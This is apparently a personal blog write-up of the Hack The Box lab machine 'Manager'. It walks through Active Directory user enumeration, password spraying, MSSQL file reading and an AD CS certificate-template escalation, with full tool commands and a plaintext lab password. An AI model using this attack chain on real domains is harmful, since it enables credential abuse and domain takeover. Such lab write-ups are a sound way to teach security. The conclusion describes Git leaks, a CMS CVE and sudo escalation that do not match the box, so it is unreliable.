---
title: "HackTheBox:Manager"
date: 2025-01-20T09:00:00+02:00
draft: false
author: "Anthony Mabi"
cover:
image: /img/manager.png   ins
# alt: 'This is an alt tag for You Are Here picture'
# caption: 'This is a caption for the image. You are not lost.'
tags: ["hackthebox","windows","hackthebox-walktrough","htb","tech"]
categories: ["hackthebox","windows","boot2root","tech"]
---

![You Are Here Sign](/img/manager.png)


Welcome to another boot2root machine! This time, we will dive into the Hack The Box machine, Manager. I must say, this box was an enjoyable challenge and provided valuable insights, especially in the area of privilege escalation-. I found the privilege escalation section  particularly fascinating due to its structured learning path and the extensive research it required. Actually windows privilege escalation is the area I have been polishing my skills on....

## Information Gathering
Let’s kick things off with an Nmap scan to map out the **attack surface** and identify open ports & services running.  I like to keep things simple, and Nmap often has everything I need. Of course you can experiment with others tools.

Based on the results there are possible attack surface including database enumeration,users. Test for weak credentials and web app vulnerabilities. See the below table that breaks down it all by mapping out the attack surface.

| **Port**             | **Service**                      | **Description**                                                    | **Potential Areas to Investigate**                                                                                                                                                             |
| -------------------- | -------------------------------- | ------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 53                   | DNS Service                      | Possible role as a DNS server for the domain manager.htb.          | Check for zone transfers and misconfigurations. Look for possible subdomains related to manager.htb.                                                                                           |
| 80                   | Web Service                      | Likely hosting a website or web application.                       | Enumerate directories and files using tools like Gobuster or Dirbuster. Test for any injection points for web related vulnerabilities<br>Fuzzing directories, looking for potential useranames |
| 88                   | Kerberos Authentication          | Used for authentication services in Active Directory environments. | Enumerate user accounts with Kerbrute. Investigate ticket-granting ticket (TGT) attacks.                                                                                                       |
| 135, 139, 445        | Microsoft RPC and SMB            | Associated with remote procedure calls and file-sharing services.  | Check for anonymous access and enumerate shares.                                                                                                                                               |
| 389, 636, 3268, 3269 | LDAP and Global Catalog Services | Used for directory services and secure communication.              | Enumerate users, groups, and Active directory related directory objects. Test for misconfigured permissions or weak passwords.                                                                 |
| 1433                 | Microsoft SQL Server             | Indicates the presence of a database server.                       | Enumerate databases, tables, and users. Test for weak credentials and any RCE & password reuse                                                                                                 |




See the below screenshot that demonstrates Nmap results
![](/img/Pasted%20image%2020250105133859.png)

![](/img/Pasted%20image%2020250105134610.png)


![](/img/Pasted%20image%2020250105134610.png)


#### Initial Observations
From the Nmap results, we can deduce a significant amount of information that serves as a starting point for further exploration. Notably, the box appears to be a *Domain Controller (DC)*, which is considered a high-value target for attackers.
**DC Name: Manager**
**Domain Name: manager.htb**

Before diving deeper, we can update our **/etc/hosts** file to resolve the domain name locally. With this it's easier for my tools to interact with the domain.
```bash
echo "10.10.11.236 manager.htb" | sudo tee -a /etc/hosts
```
#### Web Services Enumeration

I began by reviewing  the web service on port 80 to determine if it held any substantial information or hidden directories. Used  Gobuster & dirsearch for directory enumeration, but Ididn't uncover anything significant. Additionally, I performed some quick virtual host (vhost) enumeration, but it didn't bare any results. By the look of things the website itself appeared static and did not reveal any obvious entry points. see the below commands and results output.
```bash

gobuster dns -d manager.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50

dirsearch -u http://10.10.11.236/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -e *.* -t 100 -x 400,401,301,403,404
```

Attempting to identify,  any potential subdomains for the target domain.(**Nothing Found**)
![](/img/Pasted%20image%2020250105140006.png)
Checking if there are any hidden directories and files on the web service. (**Nothing Found**)

![](/img/Pasted%20image%2020250105140220.png)

Default page of the website
![](/img/Pasted%20image%2020250105162710.png)

Enumerating Virtual Hosts with Ffuf.(**Nothing Found**)
```bash
ffuf -u http://10.10.11.236 -H "Host: FUZZ.MANAGE.HTB" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac

ffuf -u http://manager.htb/ -H "Host:FUZZ.MANAGE.HTB" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac
```
![](/img/Pasted%20image%2020250105171724.png)

#### SMB Enumeration
The next thing I turned on was the SMB service to see if there were any accessible file shares. Using the `smbclient` command, I checked for open shares on the host.
SMB appeared to allow us to login via the guest account: Unfortunately, I didn't find any special or accessible file shares as indicated in the results below. (**Nothing Found**)

![](/img/Pasted%20image%2020250105201547.png)

```python
smbclient -L \\\\10.10.11.236\\ -N

- **`-L`**: This option is used to list the available shares on the remote server. It shows information about the shared folders, printers, etc., available on the server.
    
- **`\\\\10.10.11.236\\`**: This specifies the target IP address (10.10.11.236) of the SMB server you're querying. The double backslashes (`\\`) are used as escape characters to specify the SMB server path.
    
- **`-N`**: This option tells `smbclient` to not prompt for a password. It’s typically used when the remote server allows guest or anonymous access, or if you don't need authentication
```

## Enumeration
#### Enumerating Users
Next, I shifted focus to hunting domain users for AD. Since it had Kerberos is open which is a critical service for authentication in Active Directory, we can attempt to find valid usernames, groups and somet other information that can help us to conduct further attacks such as password spraying or brute-force attacks. I will spin up kerbrute in my case and pass it a wordlist from seclist.

##### Enumeration Method 1: Using Kerbrute
We can use kerbrute to enumerate users, see the below commands;

```c#
./kerbrute_linux_amd64 userenum -d manager.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.11.236 -t 200

`userenum`: Mode used for enumerating usernames.
`-d manager.htb`: Specifies the domain name to target.
`xato-net-10-million-usernames.txt`: Wordlist used to test for valid usernames.
`--dc 10.10.11.236`: Points Kerbrute to the domain controller's IP.
`-t 200`: Sets the thread count for faster enumeration.
```

![](/img/Pasted%20image%2020250105164951.png)
At this point, I managed to get potential accounts that can be used for further exploitation. The next step is to leverage these findings to gain a foothold on the target.

##### Enumeration Method 2: RID Cycling Attack
Another approach for user enumeration is through a RID cycling attack using crackmapexec/netexec as indicated in the screenshot below. RID cycling leverages null sessions and the SID-to-RID enumeration technique to enumerate user accounts.

###### RID cycling Attack
 RID cycling attack that attempts to enumerate user accounts through null sessions and the SID to RID enumeration. It's actually a good technique for enumerating user accounts in an environment with weak permissions or configurations. 
**How it Works**
- If we have access to the computer with a **null session** (an unauthenticated connection), which in our case we have, we can ask  the computer for information about users by guessing or cycling through these numbers (RIDs).
- We start at a known point (e.g., 500 for administrator) and keep incrementing the numbers to check if users exist at those IDs.
- When we hit a valid user, the system gives us the username  linked to that ID.
- SID is like an ID card number, and part of that ID (called the RID) is the part that changes for each new user or group

We can achieve this through crackmap.
```bash
crackmapexec smb 10.10.11.236 -u 'guest' -p '' --rid-brute
--rid-brute tells it to perform RID cycling to  enumerate user accounts.
```
![](/img/Pasted%20image%2020250105192243.png)



With the findings from both Kerbrute and RID cycling, we now have a strong set of potential targets for further exploitation.We can go ahead and save the results in domain user file.

Checking Kerberos Pre-Authentication
![](/img/Pasted%20image%2020250105195020.png)
```
cat domainusers.txt | tr '[:lower:]' '[:upper:]' > uppercase_users.txt
```
![](/img/Pasted%20image%2020250105193915.png)
We can also use impacket-lookupsid tool, which utilizes null sessions to enumerate SIDs and RIDs for extracting user and group information as above.
```
#### Alternative tool we can use is impacket-lookupsid 
impacket-lookupsid anonymous@manager.htb -no-pass

- anonymous@manager.htb: Specifies the user as  anonymous  for null session.
- no-pass: Indicates no password is provided.
```
![](/img/Pasted%20image%2020250105205121.png)

What now have a valid list of valid domain usernames the next steps is password spraying.

#### Password Spraying
Since now we have concrete users, we can attempt to perform some password spraying with users name as their password. We can use crackmapexec against the list of users and set no brute forcing which means it will not try all combinations, while continuing on success as shown below.

```
crackmapexec smb 10.10.11.236 -u domainusers.txt -p lowercase_users.txt --no-brute --continue-on-success
```

Found a  valid password using the identified username
operator:operator


Based on the results we I go a hit valid username and password, Let's see where this users can take us to...

![](/img/Pasted%20image%2020250105202018.png)


### Exploiting MSSQL
Since we have an Open MSSQL database, we can begin here and check if we can be able to authenticate with the user identified.I connected using impacket-mssqlclient as shown below:

```
impacket-mssqlclient manager/operator:operator@manager.htb -windows-auth
```

![](/img/Pasted%20image%2020250105212138.png)

This allows us to interact with the database, execute queries, and potentially escalate privileges if misconfigurations exist. From here, I proceeded to enumerate available databases and check for any sensitive data that might aid in further exploitation.

Weaponing Command Shell:First things first—before getting fancy, let's go for the easy win. The immediate move is to try enabling xp_cmdshell to execute system commands through SQL. However, I noted we  don't have the necessary privileges to enable it just yet

![](/img/Pasted%20image%2020250213214108.png)


![](/img/Pasted%20image%2020250213215416.png)

Since we’re lacking the required privileges, let’s pivot. The `xp_dirtree` function allows us to enumerate directories on the system. This can help us navigate the file system, locate interesting files, and even perform lateral movement if misconfigurations exist.

This means we can read files & folders on the underlying OS & there are some interesting folders here already:
- `inetpub` (webserver)
- `Recovery` (potentially backups)
- `SQL2019` (database Server)
- `Users` (domain users)

Wait....What is xp_dirtree???
xp_dirtree is an extended stored procedure in Microsoft SQL Server that allows you to list the contents of a directory on the file system. It is part of the xp_cmdshell family of extended stored procedures, which are used to execute operating system commands from within SQL Serv. With it we can be able to retrieve a list of files and subdirectories within a specified directory. 

Exploring directories and files on the server as shown below;

![](/img/Pasted%20image%2020250213220321.png)

Downloading the Back up File

![](/img/Pasted%20image%2020250213220513.png)

Upon poking around the web root of the website-backup file there was an old-config.xml with hardcoded creds for raven user and password inside it. Looks juicy. Definitely something to dig into. 

![](/img/Pasted%20image%2020250213220715.png)


We can use this credentials to aattempt to login to the server through evil-winrm as indicated below;, Poked around, and guess what? The user flag was just chilling on the desktop. Easy win. Let’s keep this party going. 🚀💻 #Pwned

![](/img/Pasted%20image%2020250213221643.png)



```python
evil-winrm  -i manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'   `
```




```
certipy-ad find -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -stdout -vulnerable
```
![](/img/Pasted%20image%2020250105220502.png)

```
certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -enable-template subca


certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip
10.10.11.236 -ca manager-dc01-ca -list-templates
```
![](/img/Pasted%20image%2020250106200058.png)

![](/img/Pasted%20image%2020250106195957.png)
```
certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip
10.10.11.236 -ca manager-dc01-ca -template SubCA -upn administrator@manager.htb

certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip
10.10.11.236 -ca manager-dc01-ca -issue-request 1
```

## 📜 Conclusion 
- This walkthrough demonstrates the process of exploiting **Git leaks**, **CMS vulnerabilities**, and **🔓 sudo configurations**.
- Key takeaways include:
    1. **⬆️ Update 👻CMS** to the latest version to fix CVE-2023-40028.
    2. Remove sensitive 📂 from production deployments.
    3. Avoid 🛠️ with elevated privileges unless absolutely necessary.
By chaining 🛠️ misconfigurations and outdated 📂, I successfully escalated privileges to *root**.

References:
https://bloodstiller.com/walkthroughs/manager-box/